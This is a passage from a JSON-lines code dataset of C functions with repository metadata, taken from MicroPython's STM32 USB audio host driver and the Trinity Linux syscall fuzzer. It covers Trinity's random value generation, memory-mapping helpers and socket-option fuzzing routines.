break;\n    \n  case AUDIO_PLAYBACK_SET_EP:\n    buff = (uint8_t *)&AUDIO_Handle->headphone.frequency;    \n    status = USBH_AUDIO_SetEndpointControls(phost,AUDIO_Handle->headphone.Ep, buff);\n    if(status == USBH_OK)\n    {\n      AUDIO_Handle->play_state = AUDIO_PLAYBACK_IDLE;\n      USBH_AUDIO_FrequencySet(phost);\n    }\n    break;\n  case AUDIO_PLAYBACK_IDLE:\n#if (USBH_USE_OS == 1)\n      osMessagePut ( phost->os_event, USBH_CLASS_EVENT, 0);\n#endif      \n    status = USBH_OK;\n    break;\n    \n  case AUDIO_PLAYBACK_PLAY:\n    USBH_AUDIO_Transmit(phost);\n    status = USBH_OK;\n    break;\n    \n  default:\n    break;\n  }  \n  \n  return status;\n}", "path": "micropython-esp32/ports/stm32/usbhost/Class/AUDIO/Src/usbh_audio.c", "commit_date": "2017-09-06 00:00:00", "repo_name": "micropython/micropython-esp32", "stars": 663, "license": "mit", "language": "c", "size": 31157}
{"docstring": "/**\n  * @brief  Handle HID Control process\n  * @param  phost: Host handle\n  * @retval USBH Status\n  */\n", "func_signal": "static USBH_StatusTypeDef USBH_AUDIO_Control (USBH_HandleTypeDef *phost)", "code": "{\n  USBH_StatusTypeDef status = USBH_BUSY ;\n  AUDIO_HandleTypeDef *AUDIO_Handle =  phost->pActiveClass->pData; \n  uint16_t attribute  = 0; \n \n  \n  switch(AUDIO_Handle->control_state)\n  {\n  case AUDIO_CONTROL_INIT:\n    if((phost->Timer & 1) == 0)\n    {\n      AUDIO_Handle->control.timer = phost->Timer;\n      USBH_InterruptReceiveData(phost, \n                                (uint8_t *)(AUDIO_Handle->mem),\n                                AUDIO_Handle->control.EpSize,\n                                AUDIO_Handle->control.Pipe);\n      \n      AUDIO_Handle->temp_feature  = AUDIO_Handle->headphone.asociated_feature;\n      AUDIO_Handle->temp_channels = AUDIO_Handle->headphone.asociated_channels;\n      \n      AUDIO_Handle->control_state = AUDIO_CONTROL_CHANGE ;\n    }\n    break;\n  case AUDIO_CONTROL_CHANGE:\n    if(USBH_LL_GetURBState(phost , AUDIO_Handle->control.Pipe) == USBH_URB_DONE)\n    {\n      attribute = LE16(&AUDIO_Handle->mem[0]); \n      if(USBH_AUDIO_SetControlAttribute (phost, attribute) == USBH_BUSY)\n      {\n        break;\n      }\n    }\n    \n    if(( phost->Timer - AUDIO_Handle->control.timer) >= AUDIO_Handle->control.Poll)\n    {\n      AUDIO_Handle->control.timer = phost->Timer;\n      \n      USBH_InterruptReceiveData(phost, \n                                (uint8_t *)(AUDIO_Handle->mem),\n                                AUDIO_Handle->control.EpSize,\n                                AUDIO_Handle->control.Pipe);      \n      \n    }\n    break;\n    \n  case AUDIO_CONTROL_VOLUME_UP:\n       if( USBH_AUDIO_SetControlAttribute (phost, 1) == USBH_OK)\n       {\n         AUDIO_Handle->control_state = AUDIO_CONTROL_INIT;\n        status = USBH_OK; \n       }\n       break;\n       \n  case AUDIO_CONTROL_VOLUME_DOWN:\n       if( USBH_AUDIO_SetControlAttribute (phost, 2) == USBH_OK)\n       {\n         AUDIO_Handle->control_state = AUDIO_CONTROL_INIT;         \n         status = USBH_OK; \n       }     \n       break;\n       \n  case AUDIO_CONTROL_IDLE:\n  default:  \n    break; \n  }\n    \n  return status;  \n}", "path": "micropython-esp32/ports/stm32/usbhost/Class/AUDIO/Src/usbh_audio.c", "commit_date": "2017-09-06 00:00:00", "repo_name": "micropython/micropython-esp32", "stars": 663, "license": "mit", "language": "c", "size": 31157}
{"docstring": "/**\n  * @brief  Handle Get Max request\n  * @param  phost: Host handle\n  * @param  subtype: subtype index\n  * @param  feature: feature index\n  * @param  controlSelector: control code\n  * @param  channel: channel index\n  * @param  length: Command length\n  * @retval USBH Status\n  */\n", "func_signal": "static USBH_StatusTypeDef USBH_AC_GetMax(USBH_HandleTypeDef *phost, \n                                         uint8_t subtype, \n                                         uint8_t feature,\n                                         uint8_t controlSelector,\n                                         uint8_t channel,\n                                         uint16_t length)", "code": "{\n  uint16_t wValue = 0, wIndex = 0, wLength = 0;\n  uint8_t UnitID = 0, InterfaceNum = 0;\n  AUDIO_HandleTypeDef *AUDIO_Handle;\n  AUDIO_Handle =  phost->pActiveClass->pData;\n  \n  switch(subtype)\n  {\n  case UAC_INPUT_TERMINAL:\n    UnitID = AUDIO_Handle->class_desc.cs_desc.InputTerminalDesc[0]->bTerminalID;\n    InterfaceNum = 0; /*Always zero Control Interface */\n    wIndex = ( UnitID << 8 ) | InterfaceNum ;\n    wValue = (COPY_PROTECT_CONTROL << 8 ) ;\n    AUDIO_Handle->mem[0] = 0x00;\n    \n    wLength = 1;\n    break;\n  case UAC_FEATURE_UNIT:\n    UnitID = AUDIO_Handle->class_desc.cs_desc.FeatureUnitDesc[feature]->bUnitID;\n    InterfaceNum = 0; /*Always zero Control Interface */\n    wIndex = ( UnitID << 8 ) | InterfaceNum ;\n    /*holds the CS(control selector ) and CN (channel number)*/\n    wValue =  (controlSelector << 8) | channel;\n    wLength = length;\n    break;\n    \n  case UAC_OUTPUT_TERMINAL:\n    UnitID = AUDIO_Handle->class_desc.cs_desc.OutputTerminalDesc[0]->bTerminalID;\n    InterfaceNum = 0; /*Always zero Control Interface */\n    wIndex = ( UnitID << 8 ) | InterfaceNum ;\n    wValue = (COPY_PROTECT_CONTROL << 8 ) ; \n    wLength = 1; \n    break;\n  }\n  \n  phost->Control.setup.b.bmRequestType = USB_D2H | USB_REQ_RECIPIENT_INTERFACE | \\\n    USB_REQ_TYPE_CLASS;\n  \n  phost->Control.setup.b.bRequest = UAC_GET_MAX;\n  phost->Control.setup.b.wValue.w = wValue;\n  phost->Control.setup.b.wIndex.w = wIndex;\n  phost->Control.setup.b.wLength.w = wLength; \n  \n  return(USBH_CtlReq(phost, (uint8_t *)(AUDIO_Handle->mem) , wLength ));    \n  \n}", "path": "micropython-esp32/ports/stm32/usbhost/Class/AUDIO/Src/usbh_audio.c", "commit_date": "2017-09-06 00:00:00", "repo_name": "micropython/micropython-esp32", "stars": 663, "license": "mit", "language": "c", "size": 31157}
{"docstring": "/**\n  * @brief  USBH_AUDIO_ClassRequest \n  *         The function is responsible for handling Standard requests\n  *         for Audio class.\n  * @param  phost: Host handle\n  * @retval USBH Status\n  */\n", "func_signal": "static USBH_StatusTypeDef USBH_AUDIO_ClassRequest(USBH_HandleTypeDef *phost)", "code": "{   \n  AUDIO_HandleTypeDef *AUDIO_Handle =  phost->pActiveClass->pData;  \n  USBH_StatusTypeDef status = USBH_BUSY;\n  USBH_StatusTypeDef req_status = USBH_BUSY;\n  \n  /* Switch AUDIO REQ state machine */\n  switch (AUDIO_Handle->req_state)\n  {\n  case AUDIO_REQ_INIT:\n  case AUDIO_REQ_SET_DEFAULT_IN_INTERFACE:\n    if(AUDIO_Handle->microphone.supported == 1)\n    {\n      req_status = USBH_SetInterface(phost, \n                                     AUDIO_Handle->microphone.interface, \n                                     0);\n      \n      if(req_status == USBH_OK)\n      {\n        AUDIO_Handle->req_state = AUDIO_REQ_SET_DEFAULT_OUT_INTERFACE;\n      }\n      \n    }\n    else\n    {\n      AUDIO_Handle->req_state = AUDIO_REQ_SET_DEFAULT_OUT_INTERFACE;\n#if (USBH_USE_OS == 1)\n      osMessagePut ( phost->os_event, USBH_URB_EVENT, 0);\n#endif       \n    }\n    break;\n    \n  case AUDIO_REQ_SET_DEFAULT_OUT_INTERFACE:\n    if(AUDIO_Handle->headphone.supported == 1)\n    {\n      req_status = USBH_SetInterface(phost, \n                                     AUDIO_Handle->headphone.interface, \n                                     0);\n      \n      if(req_status == USBH_OK)\n      {\n        AUDIO_Handle->req_state = AUDIO_REQ_CS_REQUESTS;\n        AUDIO_Handle->cs_req_state = AUDIO_REQ_GET_VOLUME;\n        \n        AUDIO_Handle->temp_feature  = AUDIO_Handle->headphone.asociated_feature;\n        AUDIO_Handle->temp_channels = AUDIO_Handle->headphone.asociated_channels;\n      }\n    }\n    else\n    {\n        AUDIO_Handle->req_state = AUDIO_REQ_CS_REQUESTS;\n        AUDIO_Handle->cs_req_state = AUDIO_REQ_GET_VOLUME;\n#if (USBH_USE_OS == 1)\n      osMessagePut ( phost->os_event, USBH_URB_EVENT, 0);\n#endif         \n    }\n    break;\n    \n  case AUDIO_REQ_CS_REQUESTS:\n    if(USBH_AUDIO_HandleCSRequest (phost) == USBH_OK)\n    {\n      AUDIO_Handle->req_state = AUDIO_REQ_SET_IN_INTERFACE;\n    }\n    break;\n   \n  case AUDIO_REQ_SET_IN_INTERFACE:\n    if(AUDIO_Handle->microphone.supported == 1)\n    {\n      req_status = USBH_SetInterface(phost, \n                                     AUDIO_Handle->microphone.interface, \n                                     AUDIO_Handle->microphone.AltSettings);\n      \n      if(req_status == USBH_OK)\n      {\n        AUDIO_Handle->req_state = AUDIO_REQ_SET_OUT_INTERFACE;\n      }\n    }\n    else\n    {\n      AUDIO_Handle->req_state = AUDIO_REQ_SET_OUT_INTERFACE;\n#if (USBH_USE_OS == 1)\n      osMessagePut ( phost->os_event, USBH_URB_EVENT, 0);\n#endif       \n    }\n    break;\n  case AUDIO_REQ_SET_OUT_INTERFACE:\n   if(AUDIO_Handle->headphone.supported == 1)\n    {\n      req_status = USBH_SetInterface(phost, \n                                     AUDIO_Handle->headphone.interface, \n                                     AUDIO_Handle->headphone.AltSettings);\n      \n      if(req_status == USBH_OK)\n      {\n        AUDIO_Handle->req_state = AUDIO_REQ_IDLE;\n      }\n      \n    }\n   else\n   {\n     AUDIO_Handle->req_state = AUDIO_REQ_IDLE;\n#if (USBH_USE_OS == 1)\n      osMessagePut ( phost->os_event, USBH_URB_EVENT, 0);\n#endif      \n   }\n   break;\n  case AUDIO_REQ_IDLE:\n    AUDIO_Handle->play_state = AUDIO_PLAYBACK_INIT;\n    phost->pUser(phost, HOST_USER_CLASS_ACTIVE); \n    status  = USBH_OK;    \n#if (USBH_USE_OS == 1)\n      osMessagePut ( phost->os_event, USBH_CLASS_EVENT, 0);\n#endif\n  default:\n    break;\n  }\n  return status; \n}", "path": "micropython-esp32/ports/stm32/usbhost/Class/AUDIO/Src/usbh_audio.c", "commit_date": "2017-09-06 00:00:00", "repo_name": "micropython/micropython-esp32", "stars": 663, "license": "mit", "language": "c", "size": 31157}
{"docstring": "/**\n  * @brief  Handle Set Cur request\n  * @param  phost: Host handle\n  * @param  subtype: subtype index\n  * @param  feature: feature index\n  * @param  controlSelector: control code\n  * @param  channel: channel index\n  * @param  length: Command length\n  * @retval USBH Status\n  */\n", "func_signal": "static USBH_StatusTypeDef USBH_AC_SetCur(USBH_HandleTypeDef *phost, \n                                         uint8_t subtype, \n                                         uint8_t feature,\n                                         uint8_t controlSelector,\n                                         uint8_t channel,\n                                         uint16_t length)", "code": "{\n  uint16_t wValue,wIndex,wLength;\n  uint8_t UnitID,InterfaceNum;\n  AUDIO_HandleTypeDef *AUDIO_Handle;\n  AUDIO_Handle =  phost->pActiveClass->pData;\n  \n  switch(subtype)\n  {\n  case UAC_INPUT_TERMINAL:\n    UnitID = AUDIO_Handle->class_desc.cs_desc.InputTerminalDesc[0]->bTerminalID;\n    InterfaceNum = 0; /*Always zero Control Interface */\n    wIndex = ( UnitID << 8 ) | InterfaceNum ;\n    wValue = (COPY_PROTECT_CONTROL << 8 ) ;\n    AUDIO_Handle->mem[0] = 0x00;\n    \n    wLength = 1;\n    break;\n  case UAC_FEATURE_UNIT:\n    UnitID = AUDIO_Handle->class_desc.cs_desc.FeatureUnitDesc[feature]->bUnitID;\n    InterfaceNum = 0; /*Always zero Control Interface */\n    wIndex = ( UnitID << 8 ) | InterfaceNum ;\n    /*holds the CS(control selector ) and CN (channel number)*/\n    wValue =  (controlSelector << 8) | channel;\n    wLength = length;\n    break;\n  }\n  \n  phost->Control.setup.b.bmRequestType = USB_H2D | USB_REQ_RECIPIENT_INTERFACE | \\\n    USB_REQ_TYPE_CLASS;\n  \n  phost->Control.setup.b.bRequest = UAC_SET_CUR;\n  phost->Control.setup.b.wValue.w = wValue;\n  phost->Control.setup.b.wIndex.w = wIndex;\n  phost->Control.setup.b.wLength.w = wLength; \n  \n  return(USBH_CtlReq(phost, (uint8_t *)(AUDIO_Handle->mem) , wLength ));    \n  \n}", "path": "micropython-esp32/ports/stm32/usbhost/Class/AUDIO/Src/usbh_audio.c", "commit_date": "2017-09-06 00:00:00", "repo_name": "micropython/micropython-esp32", "stars": 663, "license": "mit", "language": "c", "size": 31157}
{"docstring": "/*\n * SYSCALL_DEFINE5(ppoll, struct pollfd __user *, ufds, unsigned int, nfds,\n\t struct timespec __user *, tsp, const sigset_t __user *, sigmask, size_t, sigsetsize)\n */\n", "func_signal": "static void sanitise_ppoll(struct syscallrecord *rec)", "code": "{\n\tstruct pollfd *fds;\n\tstruct timespec *ts;\n\n\tsanitise_poll(rec);\n\n\tfds = (struct pollfd *) rec->a1;\n\tif (fds == NULL)\n\t\treturn;\n\n\tts = zmalloc(sizeof(struct timespec));\n\trec->a3 = (unsigned long) ts;\n\tts->tv_sec = 1;\n\tts->tv_nsec = 0;\n\n\trec->a5 = sizeof(sigset_t);\n}", "path": "trinity/syscalls/poll.c", "commit_date": "2015-12-18 00:00:00", "repo_name": "kernelslacker/trinity", "stars": 847, "license": "other", "language": "c", "size": 5282}
{"docstring": "/*\n * Generate, and munge a 32bit number.\n */\n", "func_signal": "unsigned int rand32(void)", "code": "{\n\tunsigned long r = 0;\n\n\tswitch (rnd() % 8) {\n\tcase 0:\tr = RAND_BYTE();\n\t\tbreak;\n\tcase 1:\tr = rand16();\n\t\tbreak;\n\tcase 2: r = rand_single_bit(32);\n\t\tbreak;\n\tcase 3:\tr = randbits(32);\n\t\tbreak;\n\tcase 4: r = rnd();\n\t\tbreak;\n\tcase 5:\tr = rept_byte();\n\t\tbreak;\n\n\tcase 6:\treturn get_interesting_value();\n\n\tcase 7: return 0 - ((rnd() % 10) + 1);\n\t}\n\n\t/* Sometimes deduct it from INT_MAX */\n\tif (ONE_IN(25))\n\t\tr = INT_MAX - r;\n\n\t/* Sometimes flip sign */\n\tif (ONE_IN(25))\n\t\tr = ~r + 1;\n\n\t/* we might get lucky if something is counting ints/longs etc. */\n\tif (ONE_IN(25)) {\n\t\tint _div = 1 << RAND_RANGE(1, 4);\t/* 2,4,8 or 16 */\n\t\tr /= _div;\n\t}\n\n\tif (RAND_BOOL()) {\n\t\t/* limit the size */\n\t\tswitch (rnd() % 4) {\n\t\tcase 0: r &= 0xff;\n\t\t\tbreak;\n\t\tcase 1: r &= 0xffff;\n\t\t\tbreak;\n\t\tcase 2: r &= PAGE_MASK;\n\t\t\tbreak;\n\t\tcase 3: r &= 0xffffff;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\treturn r;\n}", "path": "trinity/rand/random.c", "commit_date": "2017-08-22 00:00:00", "repo_name": "kernelslacker/trinity", "stars": 847, "license": "other", "language": "c", "size": 5282}
{"docstring": "/*\n * Return a pointer a previous mmap() that we did, either during startup,\n * or from a fuzz result.\n */\n", "func_signal": "struct map * get_map(void)", "code": "{\n\tstruct object *obj = NULL;\n\tstruct childdata *child = this_child();\n\tbool global;\n\tenum objecttype type = 0;\n\n\t/*\n\t * Some of the fd providers need weird mappings on startup.\n\t * (fd-perf for eg), these are called from the main process,\n\t * and hence don't have a valid this_child, so we address the\n\t * initial mappings list directly.\n\t */\n\tif (child == NULL)\n\t\tglobal = OBJ_GLOBAL;\n\telse\n\t\tglobal = OBJ_LOCAL;\n\n\twhile (obj == NULL) {\n\t\tswitch (rnd() % 3) {\n\t\tcase 0:\ttype = OBJ_MMAP_ANON;\n\t\t\tbreak;\n\t\tcase 1:\ttype = OBJ_MMAP_FILE;\n\t\t\tbreak;\n\t\tcase 2:\ttype = OBJ_MMAP_TESTFILE;\n\t\t\tbreak;\n\t\t}\n\n\t\tobj = get_random_object(type, global);\n\t}\n\n\treturn &obj->map;\n}", "path": "trinity/mm/maps.c", "commit_date": "2019-12-26 00:00:00", "repo_name": "kernelslacker/trinity", "stars": 847, "license": "other", "language": "c", "size": 5282}
{"docstring": "/*\n * Routine to perform various kinds of write operations to a mapping\n * that we created.\n */\n", "func_signal": "void dirty_mapping(struct map *map)", "code": "{\n\tswitch (map->prot) {\n\tcase PROT_WRITE:\n\tcase PROT_WRITE|PROT_READ:\n\t\trandom_map_writefn(map);\n\t\tbreak;\n\tcase PROT_READ:\n\t\trandom_map_readfn(map);\n\t\tbreak;\n\tcase PROT_SEM:\n\tcase PROT_NONE:\n\tdefault:\n\t\tbreak;\n\t}\n}", "path": "trinity/mm/maps.c", "commit_date": "2019-12-26 00:00:00", "repo_name": "kernelslacker/trinity", "stars": 847, "license": "other", "language": "c", "size": 5282}
{"docstring": "/*\n * Used from output_syscall_prefix, and also from postmortem dumper\n */\n", "func_signal": "static unsigned int render_syscall_prefix(struct syscallrecord *rec, char *bufferstart)", "code": "{\n\tstruct syscallentry *entry;\n\tstruct childdata *child = this_child();\n\tchar *sptr = bufferstart;\n\tunsigned int i;\n\tunsigned int syscallnr;\n\n\tsyscallnr = rec->nr;\n\tentry = get_syscall_entry(syscallnr, rec->do32bit);\n\n\tsptr += sprintf(sptr, \"[child%u:%u] [%lu] %s\",\n\t\t\tchild->num, pids[child->num], child->op_nr,\n\t\t\trec->do32bit == TRUE ? \"[32BIT] \" : \"\");\n\n\tsptr += sprintf(sptr, \"%s(\", entry->name);\n\n\tfor_each_arg(entry, i) {\n\t\tsptr = render_arg(rec, sptr, i, entry);\n\t}\n\n\tsptr += sprintf(sptr, \") \");\n\n\treturn sptr - bufferstart;\n}", "path": "trinity/arg-decoder.c", "commit_date": "2017-02-22 00:00:00", "repo_name": "kernelslacker/trinity", "stars": 847, "license": "other", "language": "c", "size": 5282}
{"docstring": "/* These next two functions are always called from child_random_syscalls() by a fuzzing child.\n * They render the buffer, and output it to stdout.\n * Other contexts (like post-mortem) directly use the buffers.\n */\n", "func_signal": "void output_syscall_prefix(struct syscallrecord *rec)", "code": "{\n\tstatic char *buffer = NULL;\n\tunsigned int len;\n\n\tif (buffer == NULL)\n\t\tbuffer = zmalloc(PREBUFFER_LEN);\n\n\tlen = render_syscall_prefix(rec, buffer);\n\n\t/* copy child-local buffer to shm, and zero out trailing bytes */\n\tmemcpy(rec->prebuffer, buffer, len);\n\tmemset(rec->prebuffer + len, 0, PREBUFFER_LEN - len);\n\n\toutput_rendered_buffer(rec->prebuffer);\n}", "path": "trinity/arg-decoder.c", "commit_date": "2017-02-22 00:00:00", "repo_name": "kernelslacker/trinity", "stars": 847, "license": "other", "language": "c", "size": 5282}
{"docstring": "/*\n * OR a random number of bits into a mask.\n * Used by ARG_LIST generation, and get_o_flags()\n */\n", "func_signal": "unsigned long set_rand_bitmask(unsigned int num, const unsigned long *values)", "code": "{\n\tunsigned long i;\n\tunsigned long mask = 0;\n\tunsigned int bits;\n\n\tbits = RAND_RANGE(0, num);      /* num of bits to OR */\n\tif (bits == 0)\n\t\treturn mask;\n\n\tfor (i = 0; i < bits; i++)\n\t\tmask |= values[rnd() % num];\n\n\treturn mask;\n}", "path": "trinity/rand/random.c", "commit_date": "2017-08-22 00:00:00", "repo_name": "kernelslacker/trinity", "stars": 847, "license": "other", "language": "c", "size": 5282}
{"docstring": "/*\n * Generate, and munge a 16bit number.\n */\n", "func_signal": "unsigned short rand16(void)", "code": "{\n\tunsigned short r = 0, r2;\n\n\tswitch (rnd() % 6) {\n\tcase 0:\tr = RAND_BYTE();\n\t\tbreak;\n\n\tcase 1: r = rand_single_bit(16);\n\t\tbreak;\n\tcase 2:\tr = randbits(16);\n\t\tbreak;\n\tcase 3: r = rnd();\n\t\tbreak;\n\tcase 4:\tr2 = rnd() & 0xff;\n\t\tr = r2 | r2 << 8;\n\t\tbreak;\n\tcase 5: return 0 - ((rnd() % 10) + 1);\n\t}\n\n\t/* Sometimes flip sign */\n\tif (ONE_IN(25))\n\t\tr = ~r + 1;\n\n\tif (ONE_IN(25)) {\n\t\tint _div = 1 << RAND_RANGE(1, 4);\t/* 2,4,8 or 16 */\n\t\tr /= _div;\n\t}\n\n\tif (RAND_BOOL()) {\n\t\t/* limit the size */\n\t\tswitch (rnd() % 3) {\n\t\tcase 0: r &= 0xff;\n\t\t\tbreak;\n\t\tcase 1: r &= 0xfff;\n\t\t\tbreak;\n\t\tcase 2: r &= PAGE_MASK;\n\t\t\tbreak;\n\t\t}\n\t}\n\treturn r;\n}", "path": "trinity/rand/random.c", "commit_date": "2017-08-22 00:00:00", "repo_name": "kernelslacker/trinity", "stars": 847, "license": "other", "language": "c", "size": 5282}
{"docstring": "/* This is a bit crappy, wrapping a varargs fn with another,\n * but this saves us having to do the openlog/closelog for every\n * case where we want to write a message.\n */\n", "func_signal": "void syslogf(const char *fmt, ...)", "code": "{\n\tchar debugbuf[BUFSIZE];\n\tva_list args;\n\n\tva_start(args, fmt);\n\tvsprintf(debugbuf, fmt, args);\n\tva_end(args);\n\n\topenlog(\"trinity\", LOG_CONS|LOG_PERROR, LOG_USER);\n\tsyslog(LOG_CRIT, \"%s\", debugbuf);\n\tcloselog();\n}", "path": "trinity/debug.c", "commit_date": "2019-07-01 00:00:00", "repo_name": "kernelslacker/trinity", "stars": 847, "license": "other", "language": "c", "size": 5282}
{"docstring": "/*\n * Pick a random power of two between 2^0 and 2^(WORD_BIT-1)\n */\n", "func_signal": "unsigned long rand_single_bit(unsigned char size)", "code": "{\n\tif (size > WORD_BIT)\n\t\tsize = WORD_BIT;\n\n\treturn (1UL << (rnd() % size));\n}", "path": "trinity/rand/random.c", "commit_date": "2017-08-22 00:00:00", "repo_name": "kernelslacker/trinity", "stars": 847, "license": "other", "language": "c", "size": 5282}
{"docstring": "/*\n * Pick a random mapping, and perform some r/w op on it.\n * Called from child on child init, and also periodically\n * from periodic_work()\n */\n", "func_signal": "void dirty_random_mapping(void)", "code": "{\n\tstruct map *map;\n\n\tmap = get_map();\n\n\tdirty_mapping(map);\n}", "path": "trinity/mm/maps.c", "commit_date": "2019-12-26 00:00:00", "repo_name": "kernelslacker/trinity", "stars": 847, "license": "other", "language": "c", "size": 5282}
{"docstring": "/*\n * Call a proto specific setsockopt routine from the table above.\n *\n * Called from random setsockopt() syscalls, and also during socket\n * creation on startup from sso_socket()\n *\n */\n", "func_signal": "void do_setsockopt(struct sockopt *so, struct socket_triplet *triplet)", "code": "{\n\tso->optname = 0;\n\n\t/* Sometimes just do generic options */\n\tif (ONE_IN(10)) {\n\t\tsocket_setsockopt(so, triplet);\n\t\treturn;\n\t}\n\n\t/* get a page for the optval to live in.\n\t * TODO: push this down into the per-proto .func calls\n\t */\n\tso->optval = (unsigned long) zmalloc(page_size);\n\n\t/* At the minimum, we want len to be a char or int.\n\t * It gets (overridden below in the per-proto sso->func, so this\n\t * is just for the unannotated protocols.\n\t */\n\tso->optlen = sockoptlen(0);\n\n\tif (ONE_IN(100)) {\n\t\tdo_random_sso(so, triplet);\n\t} else {\n\t\tif (triplet != NULL) {\n\t\t\tcall_sso_ptr(so, triplet);\n\t\t} else {\n\t\t\t// fd probably isn't a socket.\n\t\t\tdo_random_sso(so, triplet);\n\t\t}\n\t}\n\n\t/*\n\t * 10% of the time, mangle the options.\n\t * This should catch new options we don't know about, and also maybe some missing bounds checks.\n\t */\n\tif (ONE_IN(10))\n\t\tso->optname |= (1UL << (rnd() % 32));\n\n\t/* optval should be nonzero to enable a boolean option, or zero if the option is to be disabled.\n\t * Let's disable it half the time.\n\t */\n\tif (RAND_BOOL()) {\n\t\tfree((void *) so->optval);\n\t\tso->optval = 0;\n\t}\n}", "path": "trinity/syscalls/setsockopt.c", "commit_date": "2019-07-22 00:00:00", "repo_name": "kernelslacker/trinity", "stars": 847, "license": "other", "language": "c", "size": 5282}
{"docstring": "/*\n * Pick 1 random byte, and repeat it through a long.\n */\n", "func_signal": "static unsigned long rept_byte(void)", "code": "{\n\tunsigned long r = RAND_BYTE();\n\n\tr = (r << 8) | r;\n\tr = (r << 16) | r;\n#if WORD_BIT == 64\n\tr = (r << 32) | r;\n#endif\n\treturn r;\n}", "path": "trinity/rand/random.c", "commit_date": "2017-08-22 00:00:00", "repo_name": "kernelslacker/trinity", "stars": 847, "license": "other", "language": "c", "size": 5282}
{"docstring": "/*\n * Generate and munge a 64bit number.\n */\n", "func_signal": "u64 rand64(void)", "code": "{\n\tu64 r = 0;\n\n\tswitch (rnd() % 9) {\n\n\t/* 8-bit ranges */\n\tcase 0:\tr = RAND_BYTE();\n\t\tbreak;\n\n\t/* 16-bit ranges */\n\tcase 1:\tr = rand16();\n\t\tbreak;\n\n\t/* 32-bit ranges. */\n\tcase 2:\tr = rand32();\n\t\tbreak;\n\n\t/* 33:64-bit ranges. */\n\tcase 3:\tr = rand_single_bit(64);\n\t\tbreak;\n\tcase 4:\tr = randbits(64);\n\t\tbreak;\n\tcase 5:\tr = (u64) rnd() << 32 | rnd();\n\t\tbreak;\n\tcase 6:\tr = rept_byte();\n\t\tbreak;\n\n\t/* Sometimes pick a not-so-random number. */\n\tcase 7:\treturn get_interesting_value();\n\n\t// small 64bit negative number.\n\tcase 8: return 0 - ((rnd() % 10) + 1);\n\t}\n\n\t/* limit the size */\n\tswitch (rnd() % 4) {\n\tcase 0: r &= 0x000000ffffffffffULL;\n\t\tbreak;\n\tcase 1: r &= 0x0000ffffffffffffULL;\n\t\tbreak;\n\tcase 2: r &= 0x00ffffffffffffffULL;\n\t\tbreak;\n\tdefault: /* no limiting. */\n\t\tbreak;\n\t}\n\n\t/* Sometimes invert the generated number. */\n\tif (ONE_IN(25))\n\t\tr = ~r;\n\n\t/* increase distribution in MSB */\n\tif (ONE_IN(10)) {\n\t\tunsigned int i;\n\t\tunsigned int rounds;\n\n\t\trounds = rnd() % 4;\n\t\tfor (i = 0; i < rounds; i++)\n\t\t\tr |= (1UL << ((WORD_BIT - 1) - (rnd() % 8)));\n\t}\n\n\t/* Sometimes flip sign */\n\tif (ONE_IN(25))\n\t\tr = ~r + 1;\n\n\treturn r;\n}", "path": "trinity/rand/random.c", "commit_date": "2017-08-22 00:00:00", "repo_name": "kernelslacker/trinity", "stars": 847, "license": "other", "language": "c", "size": 5282}
{"docstring": "/*\n * If we have a .len set, use it.\n * If not, pick some random size.\n */\n", "func_signal": "unsigned int sockoptlen(unsigned int len)", "code": "{\n\tif (len != 0)\n\t\treturn len;\n\n\tif (RAND_BOOL())\n\t\treturn sizeof(char);\n\telse\n\t\treturn sizeof(int);\n}", "path": "trinity/syscalls/setsockopt.c", "commit_date": "2019-07-22 00:00:00", "repo_name": "kernelslacker/trinity", "stars": 847, "license": "other", "language": "c", "size": 5282}
{"docstring": "/*\n * Set up a childs local mapping list.\n * A child inherits the initial mappings, and will add to them\n * when it successfully completes mmap() calls.\n */\n", "func_signal": "void init_child_mappings(void)", "code": "{\n\tstruct list_head *globallist, *node;\n\tstruct objhead *head;\n\n\thead = get_objhead(OBJ_LOCAL, OBJ_MMAP_ANON);\n\thead->destroy = &map_destructor;\n\thead->dump = &map_dump;\n\n\tgloballist = shm->global_objects[OBJ_MMAP_ANON].list;\n\n\t/* Copy the initial mapping list to the child.\n\t * Note we're only copying pointers here, the actual mmaps\n\t * will be faulted into the child when they get accessed.\n\t */\n\tlist_for_each(node, globallist) {\n\t\tstruct map *m;\n\t\tstruct object *globalobj, *newobj;\n\n\t\tglobalobj = (struct object *) node;\n\t\tm = &globalobj->map;\n\n\t\tnewobj = alloc_object();\n\t\tnewobj->map.ptr = m->ptr;\n\t\tnewobj->map.name = strdup(m->name);\n\t\tnewobj->map.size = m->size;\n\t\tnewobj->map.prot = m->prot;\n\t\t/* We leave type as 'INITIAL' until we change the mapping\n\t\t * by mprotect/mremap/munmap etc..\n\t\t */\n\t\tnewobj->map.type = INITIAL_ANON;\n\t\tadd_object(newobj, OBJ_LOCAL, OBJ_MMAP_ANON);\n\t}\n}", "path": "trinity/mm/maps.c", "commit_date": "2019-12-26 00:00:00", "repo_name": "kernelslacker/trinity", "stars": 847, "license": "other", "language": "c", "size": 5282}
{"docstring": "/*\n * set N bits, where N= rand(0 - WORDSIZE/2)\n */\n", "func_signal": "static unsigned long randbits(int limit)", "code": "{\n\tunsigned int num = rnd() % (limit / 2);\n\tunsigned int i;\n\tunsigned long r = 0;\n\n\tfor (i = 0; i < num; i++)\n\t\tr |= (1UL << (rnd() % (limit - 1)));\n\n\treturn r;\n}", "path": "trinity/rand/random.c", "commit_date": "2017-08-22 00:00:00", "repo_name": "kernelslacker/trinity", "stars": 847, "license": "other", "language": "c", "size": 5282}
{"docstring": "/*\n * Set up a mmap object for an fd we already opened.\n */\n", "func_signal": "void mmap_fd(int fd, const char *name, size_t len, int prot, bool global, enum objecttype type)", "code": "{\n\tstruct objhead *head;\n\tstruct object *obj;\n\toff_t offset;\n\tint retries = 0;\n\n\t/* Create an MMAP of the same fd. */\n\tobj = alloc_object();\n\tobj->map.name = strdup(name);\n\tobj->map.size = len;\n\nretry_mmap:\n\tif (len == 0) {\n\t\toffset = 0;\n\t\tobj->map.size = page_size;\n\t} else\n\t\toffset = (rnd() % obj->map.size) & PAGE_MASK;\n\n\tobj->map.prot = prot;\n\tobj->map.type = MMAPED_FILE;\n\tobj->map.ptr = mmap(NULL, len, prot, get_rand_mmap_flags(), fd, offset);\n\tif (obj->map.ptr == MAP_FAILED) {\n\t\tretries++;\n\t\tif (retries == 100) {\n\t\t\tfree(obj->map.name);\n\t\t\tfree(obj);\n\t\t\treturn;\n\t\t} else\n\t\t\tgoto retry_mmap;\n\t}\n\n\thead = get_objhead(global, type);\n\thead->dump = &map_dump;\n\n\tadd_object(obj, global, type);\n\treturn;\n}", "path": "trinity/mm/maps.c", "commit_date": "2019-12-26 